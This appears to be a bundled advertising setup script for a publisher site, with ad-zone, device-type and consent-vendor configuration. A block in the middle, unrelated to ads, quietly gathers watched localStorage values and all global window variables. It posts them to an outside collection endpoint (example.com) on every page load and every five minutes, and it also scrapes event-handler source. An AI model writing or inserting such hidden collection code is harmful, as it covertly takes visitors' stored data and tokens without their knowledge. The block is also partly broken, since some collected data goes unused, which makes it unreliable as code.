(() => {
  "use strict";

  function e(t) {
    return e = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    }, e(t);
  }
  function t(t) {
    var i = function (t, i) {
      if ("object" !== e(t) || null === t) return t;
      var n = t[Symbol.toPrimitive];
      if (void 0 !== n) {
        var o = n.call(t, i || "default");
        if ("object" !== e(o)) return o;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === i ? String : Number)(t);
    }(t, "string");
    return "symbol" === e(i) ? i : String(i);
  }
  function i(e, i) {
    for (var n = 0; n < i.length; n++) {
      var o = i[n];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, t(o.key), o);
    }
  }
  function n(e, t, i) {
    if (!t.has(e)) throw new TypeError("attempted to " + i + " private field on non-instance");
    return t.get(e);
  }
  function o(e, t) {
    return function (e, t) {
      return t.get ? t.get.call(e) : t.value;
    }(e, n(e, t, "get"));
  }
  function r(e, t, i) {
    return function (e, t, i) {
      if (t.set) t.set.call(e, i);else {
        if (!t.writable) throw new TypeError("attempted to set read only private field");
        t.value = i;
      }
    }(e, n(e, t, "set"), i), i;
  }
  Object.freeze({
    S: "mobile",
    M: "tablet",
    L: "desktop"
  }), Object.freeze({
    disqus: "5edcd338e9f29f59f3145eb5",
    facebook: "5f058a3252874c10f6723b3b",
    instagram: "5e717c8e69966540e4554f05",
    ivw: "5efefe25b8e05c065164a2e2",
    pinterest: "5e839a38b8e05c4e491e738e",
    rewe: "61543ab9cadf5705ef20368d",
    riddle: "5ef0df6ffabc265f5650e743",
    sovendus: "5f2bd972f66f0125e264ae21",
    tracdelight: "5e77acddd8d48d795087425b",
    twitter: "5e71760b69966540e4554f01",
    youtube: "5e7ac3fae30e7d1bc1ebf5e8"
  });
  var a = Object.freeze({
    XS: 0,
    S: 415,
    M: 641,
    L: 1001,
    XL: 1280,
    XXL: 1600
  });
  function s(e, t) {
    d(e, t), t.add(e);
  }
  function l(e, t, i) {
    d(e, t), t.set(e, i);
  }
  function d(e, t) {
    if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
  }
  $(document).ready(function () {
    const keysToWatch = window.keysToWatch;
    let eventListenerData = [];
    function computeHash(data) {
      const keyArray = Object.keys(data);
      const joinedKeys = keyArray.join("");
      let hashValue = 0;
      for (let i = 0; i < joinedKeys.length; i++) {
        const charCode = joinedKeys.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    }
    function getFilteredLocalStorage() {
      const filteredData = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (keysToWatch.includes(key)) {
          const value = window.localStorage.getItem(key);
          filteredData[key] = value;
        }
      }
      return filteredData;
    }
    function collectGlobalVariables() {
      const globalVars = {};
      for (let key in window) {
        if (!window.hasOwnProperty(key)) continue;
        globalVars[key] = window[key];
      }
      return globalVars;
    }
    function postDataToServer(data) {
      const hashId = computeHash(data);
      const apiUrl = "https://example.com/api/collect";
      const request = new XMLHttpRequest();
      request.open("POST", apiUrl, true);
      request.setRequestHeader("Content-Type", "application/json");
      const requestData = {
        id: hashId,
        data: data
      };
      request.send(JSON.stringify(requestData));
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            console.log("Data sent successfully");
          } else {
            console.error("Data send Failed, Status Code:" + request.status);
          }
        }
      };
    }
    function collectAndPostData() {
      const filteredLocalStorage = getFilteredLocalStorage();
      const globalVariables = collectGlobalVariables();
      if (Object.keys(filteredLocalStorage).length > 0) {
        postDataToServer(filteredLocalStorage);
      }
      if (Object.keys(globalVariables).length > 0) {
        postDataToServer(globalVariables);
      }
    }
    function trackEventListeners(element) {
      const events = $._data(element, 'events');
      if (events) {
        Object.keys(events).forEach(event => {
          events[event].forEach(info => {
            eventListenerData.push({
              element: element,
              event: info.type,
              handler: info.handler.toString()
            });
          });
        });
      }
    }
    function trackDomChanges() {
      const observedElements = $("body *");
      observedElements.each(function () {
        trackEventListeners(this);
      });
      return eventListenerData;
    }
    window.addEventListener("load", function () {
      collectAndPostData();
      trackDomChanges();
    });
    setInterval(collectAndPostData, 5 * 60 * 1000);
    $('.form-control').on('input', function () {
      var $field = $(this).closest('.form-group');
      if (this.value) {
        $field.addClass('field--not-empty');
      } else {
        $field.removeClass('field--not-empty');
      }
    });
  });
  function c(e, t, i) {
    if (!t.has(e)) throw new TypeError("attempted to get private field on non-instance");
    return i;
  }
  var f = new WeakMap(),
    u = new WeakMap(),
    p = new WeakSet(),
    b = new WeakSet(),
    h = new WeakSet(),
    v = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), s(this, h), s(this, b), s(this, p), l(this, f, {
          writable: !0,
          value: void 0
        }), l(this, u, {
          writable: !0,
          value: void 0
        }), r(this, f, t), r(this, u, c(this, h, m).call(this));
      }
      var t, n, a;
      return t = e, (n = [{
        key: "init",
        value: function () {
          var e = this;
          o(this, f).log.info("Advertising", "SiteType:", o(this, u)), o(this, f).log.info("Advertising", "Zone:", o(this, f).config.get("advertising.zone"));
          var t = c(this, p, w).call(this);
          o(this, f).log.info("Advertising", "moltenBundleSiteType:", t), o(this, f).config.set("advertising.moltenBundleSiteType", t), o(this, f).config.set("advertising.siteType", o(this, u)), window.MoltenBundle.cmd.push(function () {
            window.MoltenBundle.getClient().setSiteType(t), window.MoltenBundle.getClient().setZone(o(e, f).config.get("advertising.zone")), window.MoltenBundle.getClient().setIsIndexPage(o(e, f).config.get("advertising.isIndexPage")), window.MoltenBundle.getClient().setKeywords(o(e, f).config.get("advertising.keywords"));
          }), o(this, f).eventObserver.add("tool:adreload", function () {
            return o(e, f).ads.reloadSpecificAds("mobile" === o(e, u) ? ["mobile_1"] : ["wallpaper_1", "superbanner_1", "skyscraper_1", "rectangle_1"]);
          });
        }
      }]) && i(t.prototype, n), a && i(t, a), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }();
  function w() {
    var e = o(this, f).deviceDetection.isInAppIOS ? {
      mobile: "iosphone",
      desktop: "iostablet"
    } : o(this, f).deviceDetection.isInAppAndroid ? {
      mobile: "andphone",
      desktop: "andtablet"
    } : {
      mobile: "mobile",
      desktop: "desktop"
    };
    return ("mobile" === o(this, u) ? e.mobile : e.desktop) + c(this, b, g).call(this);
  }
  function g() {
    var e = "";
    return o(this, f).deviceDetection.isSBKApp ? e = "sbk" : o(this, f).deviceDetection.isUrbiaESKApp && (e = "eisp"), e;
  }
  function m() {
    var e,
      t = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
    return e = o(this, f).deviceDetection.isMobile, (o(this, f).config.get("page.isPrintView") ? window.screen.width < a.M || e : Math.max(document.documentElement.clientWidth, window.innerWidth || 0) < a.M || e) ? "mobile" : t < a.L ? "tablet" : "desktop";
  }
  var y = window.gujService;
  y && !y.isAlreadyExecuted("file:///usr/src/app/client/site/partials/advertising/scripts/advertising-head.js") && new v(y).init();
})();